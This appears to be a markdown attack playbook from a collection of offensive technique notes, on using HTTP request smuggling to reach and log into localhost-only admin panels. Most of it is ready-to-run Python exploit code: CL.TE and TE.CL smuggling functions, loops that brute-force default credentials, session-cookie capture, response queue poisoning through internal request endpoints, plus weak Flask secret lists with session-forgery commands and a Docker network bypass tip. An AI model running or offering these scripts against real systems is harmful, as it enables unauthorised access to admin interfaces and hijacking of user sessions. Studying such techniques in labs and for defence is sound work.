# Smuggled Authentication — Reaching & Authenticating Internal Admin Panels

## When to Use

The admin/login endpoint is **only accessible via localhost** (IP-restricted). HTTP request smuggling bypasses this restriction:
1. Smuggle a GET → fetch the login form structure
2. Smuggle a POST with credentials → capture `Set-Cookie`
3. Smuggle authenticated GETs → access protected content/flag

---

## Phase 1: Reach the Internal Login Page

```python
#!/usr/bin/env python3
import socket, time, re

def smuggle_get(pub_host, pub_port, int_host, path, timeout=10):
    """CL.TE: smuggle a GET to an internal endpoint, capture response."""
    smuggled = f"GET {path} HTTP/1.1\r\nHost: {int_host}\r\nContent-Length: 5\r\n\r\nx=1\r\n"
    body = f"0\r\n\r\n{smuggled}"
    req = (f"POST / HTTP/1.1\r\nHost: {pub_host}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\n\r\n{body}")
    s = socket.socket(); s.settimeout(timeout); s.connect((pub_host, pub_port))
    s.sendall(req.encode()); time.sleep(0.3)
    s.sendall(f"GET / HTTP/1.1\r\nHost: {pub_host}\r\nConnection: close\r\n\r\n".encode())
    resp = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            resp += chunk
    except socket.timeout: pass
    s.close()
    return resp.decode(errors='replace')

# Enumerate: find internal admin login page
host, port = "target.com", 80
for int_host in ["localhost", "127.0.0.1", "internal", "backend", "admin.internal"]:
    for path in ["/admin", "/admin/login", "/login", "/management", "/panel", "/config"]:
        resp = smuggle_get(host, port, int_host, path)
        if any(kw in resp.lower() for kw in ["login", "username", "password", "sign in"]):
            print(f"[+] Internal endpoint found: {int_host}{path}")
            # Extract form field names
            for field in re.findall(r'<input[^>]+name="([^"]+)"', resp, re.I):
                print(f"  Field: {field}")
            print(resp[:600])
```

---

## Phase 2: Smuggle the Authentication POST

```python
def smuggle_auth_post(pub_host, pub_port, int_host, login_path,
                      username, password, extra_fields=None, timeout=15):
    """Smuggle a POST with credentials to an internal login endpoint."""
    creds = f"username={username}&password={password}"
    if extra_fields:
        creds += "&" + "&".join(f"{k}={v}" for k, v in extra_fields.items())

    smuggled = (f"POST {login_path} HTTP/1.1\r\nHost: {int_host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(creds)}\r\n\r\n{creds}")
    body = f"0\r\n\r\n{smuggled}"
    req = (f"POST / HTTP/1.1\r\nHost: {pub_host}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\n\r\n{body}")
    s = socket.socket(); s.settimeout(timeout); s.connect((pub_host, pub_port))
    s.sendall(req.encode()); time.sleep(0.5)
    s.sendall(f"GET / HTTP/1.1\r\nHost: {pub_host}\r\nConnection: close\r\n\r\n".encode())
    resp = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            resp += chunk
    except socket.timeout: pass
    s.close()
    return resp.decode(errors='replace')

# Try common default credentials
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", ""), ("admin", "password"), ("admin", "1234"),
    ("root", "root"), ("root", ""), ("admin", "admin123"), ("administrator", "admin"),
    ("admin", "changeme"), ("support", "support"),
]

session_cookie = None
for user, pwd in DEFAULT_CREDS:
    resp = smuggle_auth_post(host, port, "localhost", "/admin/login", user, pwd)
    cookies = re.findall(r'[Ss]et-[Cc]ookie:\s*([^\r\n]+)', resp)
    if cookies or any(kw in resp.lower() for kw in ["dashboard", "welcome", "logout", "signed in"]):
        print(f"[+] Auth success: {user}:{pwd}")
        # Extract session cookie
        for c in cookies:
            if any(n in c.lower() for n in ['session', 'auth', 'token', 'sid', 'jwt']):
                session_cookie = c.split(';')[0]
                print(f"[+] Session: {session_cookie}")
        print(f"[+] Auth response preview:")
        print(resp[:500])
        break
    print(f"[-] {user}:{pwd}")
```

---

## Phase 3: Access Protected Content with Cookie

```python
def smuggle_authed_get(pub_host, pub_port, int_host, path, cookie, timeout=10):
    """Smuggle an authenticated GET using a captured session cookie."""
    smuggled = (f"GET {path} HTTP/1.1\r\nHost: {int_host}\r\n"
                f"Cookie: {cookie}\r\nContent-Length: 5\r\n\r\nx=1\r\n")
    body = f"0\r\n\r\n{smuggled}"
    req = (f"POST / HTTP/1.1\r\nHost: {pub_host}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\n\r\n{body}")
    s = socket.socket(); s.settimeout(timeout); s.connect((pub_host, pub_port))
    s.sendall(req.encode()); time.sleep(0.3)
    s.sendall(f"GET / HTTP/1.1\r\nHost: {pub_host}\r\nConnection: close\r\n\r\n".encode())
    resp = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            resp += chunk
    except socket.timeout: pass
    s.close()
    return resp.decode(errors='replace')

if session_cookie:
    for path in ["/admin", "/admin/dashboard", "/admin/config",
                 "/admin/settings", "/api/config", "/secret", "/internal"]:
        resp = smuggle_authed_get(host, port, "localhost", path, session_cookie)
        if len(resp) > 100:  # Non-trivial response
            print(f"[+] Content at {path} ({len(resp)} bytes)")
            print(resp[:500])
        if any(kw in resp.lower() for kw in ["dashboard","settings","welcome","admin"]):
            print(f"[+] Authenticated content at {path}")
            print(resp[:400])
```

---

## TE.CL Variant

```python
def smuggle_auth_tecl(pub_host, pub_port, int_host, login_path, creds, timeout=15):
    smuggled = (f"POST {login_path} HTTP/1.1\r\nHost: {int_host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(creds)}\r\n\r\n{creds}")
    chunk_size = hex(len(smuggled))[2:]
    req = (f"POST / HTTP/1.1\r\nHost: {pub_host}\r\n"
           f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
           f"{chunk_size}\r\n{smuggled}\r\n0\r\n\r\n")
    s = socket.socket(); s.settimeout(timeout); s.connect((pub_host, pub_port))
    s.sendall(req.encode()); time.sleep(0.5)
    s.sendall(f"GET / HTTP/1.1\r\nHost: {pub_host}\r\nConnection: close\r\n\r\n".encode())
    resp = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            resp += chunk
    except socket.timeout: pass
    s.close()
    return resp.decode(errors='replace')
```

---

## Bypassing the Outermost Proxy via Internal Request Endpoints

When the outermost proxy (e.g., a reverse proxy) rewrites Host headers or blocks smuggling, look for application endpoints that make **server-side HTTP requests** to internal services. These requests bypass the outer proxy entirely.

### Discovery
```bash
# Find endpoints that make internal requests (curl/fetch/http calls)
# Common: device management, health checks, webhook testing, firmware updates
for ep in /health /health_check /status /test_connection /settings \
          /webhook/test /preview /fetch_url /update /api/status /devices; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://target$ep")
    [ "$code" != "404" ] && echo "[*] $ep -> HTTP $code"
done

# POST to trigger internal requests (many only fire on POST)
curl -s -X POST http://target/settings \
    -H "Cookie: session=YOUR_SESSION" -d "test=1"
# Examine response for internal service output
```

### Smuggling via the Internal Path

If the application has an internal request endpoint (e.g., a settings page triggers `curl http://internal-proxy:PORT/path`):

1. **Login to the app** using default/discovered credentials (the internal endpoint usually requires auth)
2. **Poison the connection** the internal endpoint uses by sending a CL.TE payload directly to the inner proxy
3. **Trigger the internal endpoint** — the application's request travels over the poisoned connection
4. **Capture the response** — the internal endpoint's response page displays the smuggled response (which came from the internal backend)

```python
#!/usr/bin/env python3
"""Response queue poisoning via internal request endpoint.
When an app endpoint calls an inner proxy, poison that proxy's connection pool."""
import socket, time, requests

# Step 1: Login and get session
s = requests.Session()
s.post("http://target/login", data={"username": "USER", "password": "PASS"})  # use discovered creds

# Step 2: Smuggle via the inner proxy (if directly accessible, e.g. port 8001)
# This poisons the connection pool
inner_proxy = ("inner-proxy-host", 8001)
smuggled = "GET /flag HTTP/1.1\r\nHost: internal.service\r\nContent-Length: 5\r\n\r\nx=1\r\n"
body = f"0\r\n\r\n{smuggled}"
req = (f"POST / HTTP/1.1\r\nHost: {inner_proxy[0]}\r\n"
       f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\n\r\n{body}")
sock = socket.socket(); sock.settimeout(10)
sock.connect(inner_proxy); sock.sendall(req.encode())
time.sleep(0.3)
sock.sendall(f"GET / HTTP/1.1\r\nHost: {inner_proxy[0]}\r\n\r\n".encode())
resp = b""
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk: break
        resp += chunk
except: pass
sock.close()
print(resp.decode(errors='replace')[:2000])

# Step 3: Trigger the internal endpoint (app's curl goes through poisoned connection)
r = s.post("http://target/settings", data={"param": "value"})  # endpoint that triggers internal request
print(r.text[:2000])  # may contain smuggled response from internal backend
```

---

## Weak Secret Keys and Session Forgery

Some frameworks use **hardcoded or weak secret keys** that allow session cookie forgery without needing to authenticate at all:

```python
# Common weak Flask secret keys — try these to forge sessions
WEAK_SECRETS = [
    'your_secret_key', 'secret', 'secret_key', 'changeme', 'dev',
    'development', 'supersecret', 'key', 'flask-secret',
    'my_secret_key', 'password', 'admin', 'default',
]

# Flask session cookie forgery (requires flask-unsign: pip install flask-unsign)
# Step 1: Extract the session cookie from the target
# Step 2: Try to decode with weak keys
# flask-unsign --decode --cookie "eyJ..." --secret "your_secret_key"
# Step 3: Forge a new session with admin privileges
# flask-unsign --sign --cookie '{"username":"admin","user_id":1}' --secret "your_secret_key"
```

**When to try:** Login page branded as Flask/Python, or `Set-Cookie` header shows base64-encoded JSON with a signature (Flask's default signed cookie format).

---

## Key Tips

- **Send follow-up immediately** after the smuggle — poisoned connection state is short-lived
- **Retry 2-3 times** — connection reuse timing can affect response capture
- **Check 302 redirects** in the smuggled response — follow the `Location:` path next
- **Try CL.TE then TE.CL** if first doesn't yield a cookie
- **TE obfuscation** if standard CL.TE is rejected (see `http-request-smuggling-advanced.md`)
- **After capturing cookie**, also try direct HTTP requests with it — sometimes sessions are valid externally
- **Check for internal request endpoints** — app endpoints that call internal services bypass the outer proxy; use these to reach inner proxies where smuggling may be easier
- **Try weak secret keys** before brute-forcing auth — many dev/test deployments use hardcoded Flask/Django secret keys that allow session forgery
- **Docker/container bypass** — if the outer proxy (mitmproxy) rewrites Host on ALL requests and blocks all smuggling, use `docker ps` + `docker exec` or `docker run --network` to connect directly to the inner proxy (HAProxy) from inside the Docker network. Run the CL.TE exploit from there — see quickstart Pattern 0c
